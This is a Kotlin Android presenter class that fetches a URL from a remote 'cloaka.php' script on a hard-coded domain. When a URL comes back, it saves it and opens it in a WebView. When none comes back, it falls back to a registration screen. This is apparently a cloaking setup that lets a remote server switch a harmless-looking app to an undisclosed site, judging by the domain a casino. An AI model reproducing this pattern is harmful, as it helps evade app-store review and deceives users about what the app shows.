package com.example.second_portfolio_proj.presenters

import android.content.SharedPreferences
import android.util.Log
import com.example.second_portfolio_proj.API.RequestPhpService
import com.example.second_portfolio_proj.ScriptPOJO
import com.example.second_portfolio_proj.module.NetworkModule
import com.example.second_portfolio_proj.views.NasaActivityView
import kotlinx.coroutines.*
import moxy.MvpPresenter
import okhttp3.OkHttpClient
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.coroutines.CoroutineContext


class MainActivityPresenter: MvpPresenter<NasaActivityView>(),CoroutineScope
{
    companion object {
        const val IS_NOT_FIRST="is_not_a_first"
        const val REG="reg"
        const val BaseURL="http://platinum-kaz.ru/"
    }
    override val coroutineContext: CoroutineContext = SupervisorJob() +Dispatchers.Main.immediate

    fun goRetrofit(network: NetworkModule, sp: SharedPreferences) {
        launch { //TODO переделать
            val service = network.getRetrofit(BaseURL).create(
                RequestPhpService::class.java
            )
            val phpResponse = service.getScriptInfo()
                        phpResponse.url=null //заменю на другой для теста
                        Log.d("key",phpResponse.url.toString())
                        if (phpResponse.url!=null) {
                            sp.edit().putString(IS_NOT_FIRST,phpResponse.url).apply()
                            viewState.goInWebView(phpResponse.url.toString())
                        }
                        else {
                            sp.edit().putString(IS_NOT_FIRST, REG).apply()
                            viewState.goReg()
                        }
                    }
                }





    fun goNetw2(sp: SharedPreferences) {
        CoroutineScope(Dispatchers.IO).launch {
            val temp=doGet("http://platinum-kaz.ru/cloaka.php?id=2ottk6qvq3n63jec38t8")
            withContext(Dispatchers.Main){
            var answer= temp?.substringAfter("\"url\":\"")
                answer = answer?.substring(0,answer.length - 2)
            //answer=null //как будто url нет в скрипте
            if (answer.equals("null") || answer==null) {
                sp.edit().putString(IS_NOT_FIRST, REG).apply()
                viewState.goReg()
            }
            else {
                sp.edit().putString(IS_NOT_FIRST,answer).apply()
                viewState.goInWebView(answer.toString()) //костыль
            }
            }
        }
    }


    private fun doGet(url: String?): String? {
        val obj = URL(url)
        val connection: HttpURLConnection = obj.openConnection() as HttpURLConnection
        connection.setRequestMethod("GET")
        connection.setRequestProperty("User-Agent", "Mozilla/5.0")
        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5")
        connection.setRequestProperty("Content-Type", "application/json")
        val bufferedReader =
            BufferedReader(InputStreamReader(connection.getInputStream()))
        var inputLine: String?=null
        val response = StringBuffer()
        while (bufferedReader.readLine().also({ inputLine = it }) != null) {
            response.append(inputLine)
        }
        bufferedReader.close()
        return response.toString()
    }


    fun isFirst (sp:SharedPreferences) :Boolean {
        if (sp.contains(IS_NOT_FIRST)) return false
        return true
    }

    fun redirect(sp:SharedPreferences) {
        val url=sp.getString(IS_NOT_FIRST,"")
        if (url!= REG && url!=null) {
                viewState.goInWebView(url)
        }
        else viewState.goReg()
    }



}